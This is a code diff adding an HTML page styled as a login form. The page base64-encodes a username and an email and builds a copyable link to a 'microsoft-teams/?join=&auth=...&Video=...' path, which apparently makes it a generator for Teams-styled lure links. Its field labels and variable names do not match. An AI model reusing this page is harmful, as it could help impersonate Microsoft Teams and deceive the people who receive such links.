@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login Form</title>
+<link rel="shortcut icon" href="https://i.ibb.co/PZkBww7N/logo2.png">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            background: linear-gradient(135deg, #4e73df, #1cc88a);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            background: #ffffff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.15);
+            width: 350px;
+        }
+
+        h2 {
+            text-align: center;
+            margin-bottom: 25px;
+            color: #333;
+        }
+
+        label {
+            font-size: 14px;
+            font-weight: bold;
+            color: #555;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin-top: 6px;
+            margin-bottom: 18px;
+            border-radius: 6px;
+            border: 1px solid #ddd;
+            font-size: 14px;
+            transition: 0.3s;
+        }
+
+        input[type="text"]:focus {
+            border-color: #4e73df;
+            outline: none;
+            box-shadow: 0 0 5px rgba(78,115,223,0.3);
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 6px;
+            background-color: #4e73df;
+            color: white;
+            font-size: 15px;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 5px;
+        }
+
+        button:hover {
+            background-color: #2e59d9;
+        }
+
+        #message {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #444;
+            word-wrap: break-word;
+            background: #f8f9fc;
+            padding: 8px;
+            border-radius: 5px;
+        }
+
+        .copy-btn {
+            background-color: #1cc88a;
+            margin-top: 10px;
+        }
+
+        .copy-btn:hover {
+            background-color: #17a673;
+        }
+
+        input[type="hidden"] {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <h2>Login</h2>
+
+    <form id="loginForm">
+        <!-- Company Name -->
+        <label for="email">Username  :</label>
+        <input type="text" id="email" name="email" required>
+
+        <input type="hidden" id="emails" value="dd" name="email" required>
+
+        <!-- Email -->
+        <label for="password">Email:</label>
+        <input type="text" id="password" name="password" required>
+
+        <button type="submit">Submit</button>
+    </form>
+
+    <p id="message"></p>
+
+    <button class="copy-btn" onclick="copyText()">Copy</button>
+
+</div>
+
+<script>
+    const form = document.getElementById("loginForm");
+
+    form.addEventListener("submit", function(event) {
+        event.preventDefault();
+
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
+
+        const convertemail = btoa(email);
+        const convertemails = btoa(password);
+
+        if (email && password) {
+            console.log("Email:", email);
+            console.log("Password:", password);
+
+            const rootUrl = window.location.origin + window.location.pathname.replace(/\/[^/]*$/, '/');
+            const shareUrl = rootUrl + "microsoft-teams/?join=&auth=" + convertemails + "&Video=" + convertemail;
+
+            document.getElementById("emails").value = shareUrl;
+            document.getElementById("message").innerHTML =
+                '<a href="' + shareUrl + '" target="_blank" rel="noopener noreferrer">' + shareUrl + '</a>';
+        }
+    });
+
+    async function copyText() {
+        const input = document.getElementById("emails");
+        const text = (input.value || "").trim();
+
+        if (!text) {
+            return;
+        }
+
+        try {
+            await navigator.clipboard.writeText(text);
+            console.log("Copied successfully:", text);
+            document.getElementById("message").textContent = "Link copied to clipboard.";
+        } catch (err) {
+            try {
+                input.focus();
+                input.select();
+                document.execCommand("copy");
+                console.log("Copied successfully using fallback:", text);
+                document.getElementById("message").textContent = "Link copied to clipboard.";
+            } catch (fallbackErr) {
+                console.error("Error:", fallbackErr);
+                document.getElementById("message").textContent = "Copy failed. Please select and copy the link manually.";
+            }
+        }
+    }
+</script>
+
+</body>
+</html>
